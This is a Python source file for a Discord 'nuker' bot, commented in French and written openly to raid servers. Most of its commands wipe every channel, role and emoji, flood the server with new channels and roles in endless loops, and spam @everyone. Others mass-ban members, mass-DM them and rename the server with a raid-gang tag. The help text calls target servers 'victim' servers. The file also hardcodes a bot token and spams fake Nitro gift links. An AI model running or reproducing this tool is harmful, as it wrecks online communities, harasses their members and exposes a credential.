import asyncio
import time 
import logging
import colorama
import random 
import os
import discord
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands, tasks
from discord.ext.commands import bot
from itertools import cycle
from colorama import Fore as C
from colorama import Style as S
import sys
import json
import requests
from discord import Member
from discord.ext.commands import has_permissions, MissingPermissions
from pypresence import Presence
import psutil
import aiohttp
from termcolor import colored
#-----------------------ACTIVITY AND LAUNCH------------------------------------
intents = discord.Intents.all()
intents.members = True


token = "ODgzODU2MDQ0OTU3MjYxODk0.YTQBFg.-bmErhIICyk3JvQp45fK1vOQmww"
channel_names = ['raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵', "raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵"]
bio = ['raid shadow legend']


SKIP_BOTS = False

print('connection au nuker...')
os.system("cls")

prefix = "r!","rr"

client = commands.Bot(command_prefix=prefix, intents=intents)

client.remove_command('help')
#-----------------------ACTIVITY AND LAUNCH------------------------------------

@client.event
async def on_connect():
    print(f"{client.user} est en ligne et pret a l'emploie")
    print("--------------")


@client.event
async def on_ready():
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.playing, name=random.choice(bio)))


command_prefix=prefix
@client.event
async def on_message(message):
   if message.content.startswith (client.user.mention):
       await message.channel.send(f"Hey {message.author}, my prefix for this server is {str(command_prefix)}")

   await client.process_commands(message)

@client.command()
async def idel (ctx):
    await ctx.guild.edit(icon=None)
    print (f"icone du serveur {ctx.guild.name} supprimé")



@client.command()
async def leaveg(ctx, *, guild_name):
    guild = discord.utils.get(client.guilds, name=guild_name) # Get the guild by name
    if guild is None:
        print("No guild with that name found.") # No guild found
        return
    await guild.leave() # Guild found
    await print(f"I left: {guild.name}!")



@client.command()
async def ci(ctx,*, guildid):
  try:
    guild = discord.utils.get(client.guilds, name=guildid)
    invitelink = ""
    i = 0
    while invitelink == "":
      channel = guild.text_channels[i]
      link = await channel.create_invite(max_age=300,max_uses=1)
      invitelink = str(link)
      i += 1
    await ctx.send(invitelink)
  except Exception:
    await ctx.send("Something went wrong")





@client.command()
async def big(ctx, emoji: discord.Emoji):
    embed = discord.Embed (title = f" emoji name : {emoji.name} ", description = f"( id : {emoji.id} )", color = discord.Colour.random())
    embed.set_image(url=emoji.url)
    await ctx.send(embed=embed)

@big.error
async def big_error(ctx, error):
    if isinstance (error, commands.EmojiNotFound):
        await ctx.send ("its not a custom emoji or I am not in the server that contains this emoji")
    else:
        raise error

@client.command()
async def hot(ctx, *, user: discord.Member = None):

        if not user:
          user = ctx.message.author

        hot = ["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100"]
        hoth = random.choice(hot)
        emoji = "❤️"
        if int(hoth) > 25:
            emoji = "❤️"
        elif int(hoth) > 50:
            emoji = "💖"
        elif int(hoth) > 75:
            emoji = "💞"
        else:
            emoji = "💔"

        h = discord.Embed(title=f"**{user.name}** est chaud à **{hoth}%** {emoji}")
        await ctx.send(embed=h)

@client.command()
async def botstat(ctx):
    servers = client.guilds
    description_info = ""
    
    for guild in servers:
        description_info += "**" + str(guild.name) + "**\n" + str(guild.member_count) + " members\n\n"

    embed = discord.Embed(description = description_info, colour=0x7289DA) # Edit the embed line to include the description we created above
    embed.set_footer(text=f"Guilds requested by {ctx.author}", icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)


@client.command()
async def d(ctx,*,message):
    count=0
    for channel in ctx.guild.channels:
        if message in channel.name:
            await channel.delete()
            count += 1
        else:
            pass
    await ctx.send(f"i have deleted {count} channels containing {message}")

@client.command()
async def invites(ctx, user: discord.Member=None):
    if user == None:
       user = ctx.author
    else:
       user = user
    totalInvites = 0
    for i in await ctx.guild.invites():
        if i.inviter == user:
            totalInvites += i.uses
    embed= discord.Embed(title=f"{user} has invited {totalInvites} member{'' if totalInvites == 1 else 's'}!", color = 0xff97ff)
    embed.set_footer(text =f"requested by : {ctx.author}", icon_url= ctx.author.avatar_url)
    await ctx.send(embed=embed)




@client.command(pass_context=True)
async def cnuke(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='cnuke cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)

    for channel in list(ctx.message.guild.channels):
       try:
           await channel.delete()
           print(f"le salon {channel.name} a été supprimé😈.")
       except:
            pass

    
    for i in range(1):
        try:
            await ctx.guild.edit(name="raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵", icon=None)
            print("nom changé😈!")
        except:
            print("le nom n'a pas été changé")

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(200):
                  await guild.create_text_channel(random.choice(channel_names))






@client.command(pass_context=True)
async def rnuke(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='rnuke cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)

    for role in list(ctx.message.guild.roles):
        try:
           await role.delete()
           print(f"le role {role.name} a été supprimé😈.")
        except:
            pass

    for i in range(1):
        await guild.create_role(name="raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵")
    while True:
        for role in list(ctx.message.guild.roles):
            for i in range(200):
                await guild.create_role(name="raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵")




#-----------------------COMMANDS DEL----------------------------------------


@client.command(pass_context=True)
async def cdel(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='cdel cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)

    for channel in list(ctx.message.guild.channels):
        try:
           await channel.delete()
           print(f"le salon {channel.name} a été supprimé😈.")
        except:
            pass





@client.command(pass_context=True)
async def rdel(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='rdel cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)

    for role in list(ctx.message.guild.roles):
        try:
           await role.delete()
           print(f"le role {role.name} a été supprimé")
        except:
            pass



@client.command(pass_context=True)
async def edel(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='edel cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)

    for emoji in list(ctx.message.guild.emojis):
        try:
           await emoji.delete()
           print(f"l'emoji {emoji.name} a été supprimé")
        except:
            pass

 
        
            


#-----------------------COMMANDS CREATE--------------------------------------

@client.command(pass_context=True)
async def ccreate(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='ccreate cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(200):
                await guild.create_text_channel(random.choice(channel_names))




@client.command(pass_context=True)
async def rcreate(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='rcreate cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)

    for i in range(1):
        await guild.create_role(name="raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵")
    while True:
        for role in list(ctx.message.guild.roles):
            for i in range(200):
                await guild.create_role(name="raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵")



#-----------------------KICK ,BAN AND CLEAR----------------------------------------


@client.command(pass_context=True)
async def kick(ctx, user : discord.User, reason=None):
    guild = ctx.message.guild
    await ctx.message.delete()
    await ctx.guild.kick(user , reason=reason)
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='kick cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)

    await ctx.send(f"{user} à été kick du serveur😈")

        

@client.command(pass_context=True)
async def ban(ctx, user : discord.User, reason=None):
    guild = ctx.message.guild
    await ctx.message.delete()
    await ctx.guild.ban(user , reason=reason)
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='ban cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)
    await ctx.send(f"{user} à été banni du serveur😈")


@client.command(pass_context=True)
async def clear(ctx, amount = 5):
    guild = ctx.message.guild
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='clear cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)    



@client.command(pass_context=True)
async def spam(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    print('salons spammé')
    for i in range(2):
      while True:
             for channel in guild.text_channels:
                 try:
                     await channel.send("@everyone this server is raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵ ")
                 except Exception:
                        continue
                    


#-----------------------COMMANDS HELP-----------------------------------------

@client.command()
async def help(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    embed=discord.Embed(
title="HELP COMMAND",
url="https://discord.gg/CURjqNd6rs",
description=
  '\n MY PREFIX IS : **r!**'
  '\n-----------------------------'
  '\n **NUKE AND SPAM COMMANDS:**'

  '\n cnuke           : delete all channel and create maximum new channels'
  '\n rnuke           : delete all roles and create maximum new roles'
  '\n spam            : spam everyone in all channels'
  '\n -----------------------------'
  '\n **DELETE COMMANDS:**'

  '\n cdel            : delete all channels'
  '\n rdel            : delete all roles(under the bot role)'
  '\n edel            : delete all emojis'
  '\n -----------------------------'
  '\n **CREATE COMMANDS:**'

  '\n ccreate         : create 500 channels'
  '\n rcreate         : delete all roles(under the bot role)'
  '\n -----------------------------'
  '\n **MODERATION COMMANDS:**'

  '\n ban <user>      : ban mentionned user'
  '\n kick <user>     : ban mentionned user'
  '\n clear [amount]  : delete messages'
  '\n -----------------------------'
  '\n **OTHERS COMMANDS:**'
  '\n say [text]      :répète ce que tu dis'
  '\n invite_me       :invite the bot in your victim server(s) :smiling_imp::joy:'
  '\n -----------------------------'
  '\n  **GENERATOR COMMANDS:**'
  '\n  nitro          :gen 100 random nitro links (you have a infime chance to get a valid nitro)'
  "\n  raid           : envoyer une invite du serv a raid dans le serveur principal pour qu'on vous aide",
color=discord.Color.green())
    await ctx.send(embed=embed)




@client.command()
async def ping(ctx):
    embed=discord.Embed(
title=f'Mon ping est de **{round(client.latency * 1000)}**ms',
color=discord.Color.green())
    await ctx.send(embed=embed)





@client.command(pass_context=True)
async def invite_me(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    embedVar=discord.Embed(title="\n voici le lien pour m'inviter hehe",
description="\n mon lien hehe: https://discord.com/oauth2/authorize?client_id=837755774851350569&permissions=8&redirect_uri=https%3A%2F%2Fdiscord.com%2Foauth2%2Fauthorized&scope=bot" 
"\n le serveur de support hehe : https://discord.gg/CURjqNd6rs", color=0xff80ff)
    embedVar.set_thumbnail(url=ctx.author.avatar_url)
    await ctx.send(embed=embedVar)

    channel = client.get_channel(848122267392147476)
    embedVar=discord.Embed(title='**INVITATION** demendé par :'
       '\n **{0.author}**'
       '\n     '
       '\n dans le serveur :'
       '\n**{0.guild}** '.format(ctx),
  color=0xff97ff)
    embedVar.set_thumbnail(url=ctx.author.avatar_url)
    await channel.send(embed=embedVar)
    
    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='invite cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)



@client.command()
async def say(ctx, *, message):
    guild = ctx.message.guild
    await ctx.message.delete()
    await ctx.send(message)

    previous_status = client.guilds[0].get_member(client.user.id).activity
    
    # Change activity for the task
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='say cmd activated!'))
    
    # Long Running Task
    time.sleep(3)

    
    # Reset the status
    await client.change_presence(activity=previous_status)


#-----------------------GEN-------------------------------------------------

def gen():
    chars = ['a', 'b', 'c', 'd',  'e','f', 'g', 'h','i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
    '1','2','3','4','5','6','7','8','9','0'
    ]
    return "".join(random.choices(chars, k=16))

link = "https://discord.gift/"


@client.command()
async def nitro(ctx):
    amount=100
    for i in range(amount): # Do the next thing amount times
        await ctx.send(link + gen())

#-----------------------TOKEN-------------------------------------------------
"""
@client.command()
async def raid(ctx):

    linkVar = await ctx.channel.create_invite(max_age = 43200)
    channel = client.get_channel(848122267392147476)
    embedVar=discord.Embed(title='**RAID** envoyé par :'
       '\n **{0.author}**'
       '\n     '
       '\n dans le serveur :'
       '\n**{0.guild}** ',
  color=0xff97ff)
    embedVar.set_thumbnail(url=ctx.author.avatar_url)
    embedVar.add_field(name="voici l'invite du serveur à raid :", value=linkVar)
    await channel.send(embed=embedVar)
"""


@client.command()
async def dmall(ctx):
    guild = ctx.guild
    for m in guild.members:
        try:
            await m.send(f"the server **{ctx.guild.name}** is raid by 4̷N̵0̶N̷Y̵M̶0̷U̵S̷ ̸G̶4̷N̵G̵")
            print('\033[92m' f"[Success] Successfully sent to {m}.")

        except Exception as e:
            print('\033[91m' f"[Failure] Failed to send to {m}")

    print('\033[0m' f"[Done] Finnished!")



@client.command()
async def massban(ctx):
    for user in ctx.guild.members:
        try:
            await user.ban()
            print('\033[92m' f"[Success] Successfully banned {user.name}.")



        except Exception as e:
            print('\033[91m' f"[Failure] Failed to ban {user.name}")

    print('\033[0m' f"[Done] Finnished!")





@client.command()
async def masskick(ctx):
    for user in ctx.guild.members:
        try:
            print('\033[92m' f"[Success] Successfully kicked {user}.")



        except Exception as e:
            print('\033[91m' f"[Failure] Failed to kick {user}")

    print('\033[0m' f"[Done] Finnished!")









@client.command(pass_context=True)
async def massnick(ctx):
    for user in ctx.guild.members:
        try:
            await user.edit(nick='lol')
            print('\033[92m' f'[Succes]Nickname was changed for {user} ')
        except Exception as e:
            print('\033[91m' f"[Failure]Nickname wasn't changed for {user}")

    print('\033[0m' f"[Done] Finnished!")

@client.command()
async def unban(ctx, *, user):
   guild = ctx.message.guild
   await ctx.message.delete()
   banned_users = await ctx.guild.bans()

   for ban_entry in banned_users:
     user = ban_entry.user
  
   if (user.id, user.name):
     await ctx.guild.unban(user)
     return






client.run(token)